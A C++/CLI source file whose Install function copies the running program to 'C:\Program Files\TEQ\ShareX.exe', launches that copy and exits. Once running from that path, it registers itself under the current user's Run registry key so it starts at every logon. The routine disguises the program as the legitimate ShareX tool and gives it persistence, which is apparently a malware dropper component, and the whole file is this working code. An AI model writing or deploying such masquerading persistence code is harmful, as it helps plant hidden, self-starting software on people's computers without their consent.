#include "pch.h"
#include "Install.h"

void Install(String^ path) {
	    if (Application::ExecutablePath == "C:\\Program Files\\TEQ\\ShareX.exe")
	    {
	        Microsoft::Win32::RegistryKey^ key = Microsoft::Win32::Registry::CurrentUser->OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
	        key->SetValue("ShareX.exe", Application::ExecutablePath);
			try {

			}
			catch(Exception^ h) {}
	    }
	    else {
	        String^ kk = Application::ExecutablePath ;
	        File::WriteAllBytes("C:\\Program Files\\TEQ\\ShareX.exe", File::ReadAllBytes(kk));
	        System::Diagnostics::Process::Start("C:\\Program Files\\TEQ\\ShareX.exe");
	        Environment::Exit(0);
	    }
}
